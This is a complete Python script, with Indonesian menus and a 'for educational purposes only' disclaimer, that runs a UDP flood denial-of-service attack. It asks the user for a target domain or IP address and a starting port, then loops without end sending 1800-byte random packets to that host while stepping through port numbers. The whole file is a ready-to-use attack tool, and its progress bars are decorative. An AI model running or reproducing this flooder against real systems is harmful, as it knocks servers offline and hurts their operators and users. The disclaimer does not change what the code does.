'''
Developer: Skrip ini hanya untuk tujuan pendidikan. Penulis tidak bertanggung jawab atas masalah atau kerusakan yang disebabkan oleh Tools Ini


coded:

░██████╗░█████╗░██████╗░███████╗██████╗░
██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
╚█████╗░███████║██████╦╝█████╗░░██████╔╝
░╚═══██╗██╔══██║██╔══██╗██╔══╝░░██╔══██╗
██████╔╝██║░░██║██████╦╝███████╗██║░░██║
╚═════╝░╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
'''



from platform import system
import os
import time
import random
import socket
from urllib import request
import sys
path=os.getcwd()
path=os.path.join(path,'lib')
sys.path.append(path)
import colorama
from colorama import Fore,Back,Style
from tqdm.auto import tqdm
de_version="1.1"
colorama.init()
def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):  
        command = 'cls'
    os.system(command)
    
def ddos():    
    def banner():
        clearConsole()
        print(Fore.RED+'''
                                                      

░██████╗░█████╗░██████╗░███████╗██████╗░
██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
╚█████╗░███████║██████╦╝█████╗░░██████╔╝
░╚═══██╗██╔══██║██╔══██╗██╔══╝░░██╔══██╗
██████╔╝██║░░██║██████╦╝███████╗██║░░██║
╚═════╝░╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝       
   '''+Style.RESET_ALL+Fore.YELLOW+Style.BRIGHT+''' 
                            ·▄▄▄▄  ·▄▄▄▄        .▄▄ · 
                            ██▪ ██ ██▪ ██ ▪     ▐█ ▀. 
                            ▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
                            ██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█
                            ▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ 

        '''+Style.RESET_ALL+Fore.MAGENTA+Style.BRIGHT+'''
by: b i y i v i   
             
        '''+Style.RESET_ALL)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1800)

    def chech_con():
        try:
            request.urlopen('https://www.google.co.in/',timeout=3)
        except KeyboardInterrupt:
            print(Fore.RED+Style.BRIGHT + "dihentikan oleh pengguna..." + Fore.RESET)
            exit()
        except:
            print(Fore.RED+Style.BRIGHT+'Silakan periksa koneksi internet Anda...'+Fore.RESET)
            exit()
 
    try:
        print(Fore.CYAN+Style.BRIGHT+"Memeriksa koneksi internet.... "+Fore.RESET)
        for i in tqdm(range(30000)):
            print(end=Fore.MAGENTA+Style.BRIGHT+'\r')

        time.sleep(1)
        chech_con()

    except KeyboardInterrupt:
        print(Fore.RED +Style.BRIGHT+ "dihentikan oleh pengguna" + Fore.RESET)
        exit()
    try:
        while True:
            banner()
            print(Fore.GREEN+Style.BRIGHT+"1."+Style.RESET_ALL+Fore.YELLOW+" domain situs web"+Fore.GREEN+Style.BRIGHT+"\n2."+Style.RESET_ALL+Fore.YELLOW+" Alamat IP"+Fore.GREEN+Style.BRIGHT+"\n3."+Style.RESET_ALL+Fore.YELLOW+" Meninggalkan")
            opt=str(input(Fore.RED+Style.BRIGHT+"\n>>> "+Fore.RESET))
            if opt=='1':
                domain=str(input(Fore.CYAN+Style.BRIGHT+"Masuk ke situs web(ej:google.com):"+Fore.RESET))
                ip=socket.gethostbyname(domain)
                break
            elif opt=='2':
                ip = input(Fore.CYAN+Style.BRIGHT+"Direccion IP  : "+Fore.RESET)
                break
            elif opt=='3':
                time.sleep(1)
                print(Fore.RED+"Sampai berjumpa lagi :D"+Fore.RESET)
                exit()
            else:
                print(Fore.RED+'Opsi tidak valid!'+Fore.RESET)
                time.sleep(2)

        port =int(input(Fore.CYAN+Style.BRIGHT+"nomor port  : "+Fore.RESET))

        print(Fore.YELLOW+Style.BRIGHT+"mulai...."+Style.RESET_ALL)
        clearConsole()
        time.sleep(2)

        print(Fore.RED+Back.LIGHTGREEN_EX+"mulai menyerang server ..."+Style.RESET_ALL)
        for i in tqdm(range(30000)):
            print(end=Fore.MAGENTA+'\r')
        time.sleep(1)
        sent = 0
    except Exception as e:
        print(Fore.RED+"¡Ada yang salah!")
        print("Razon: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    try:
        while True:
            sock.sendto(bytes, (ip,port))
            sent=sent+1
            port=port+1
            color_list = [Fore.RED+Style.BRIGHT+Back.MAGENTA, Fore.GREEN+Style.BRIGHT+Back.RED, Fore.YELLOW+Style.BRIGHT+Back.GREEN, Fore.BLUE+Style.BRIGHT+Back.CYAN, Fore.MAGENTA+Style.BRIGHT+Back.WHITE, Fore.CYAN+Style.BRIGHT+Back.BLUE, Fore.WHITE+Style.BRIGHT+Back.RED ]
            color_random = random.choice(color_list)

            print(color_random+"Kemasan %s Terkirim %s seberang pelabuhan:%s" % (sent, ip, port))
            if port==65534:
                port=1
            elif port==1900:
                port=1901
    except Exception as e:
        print(Fore.RED+Style.BRIGHT+"Selesai\nAlasan: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    except KeyboardInterrupt:
        print(Fore.RED+Style.BRIGHT+"\nPengguna berhenti"+Fore.RESET)



ddos()
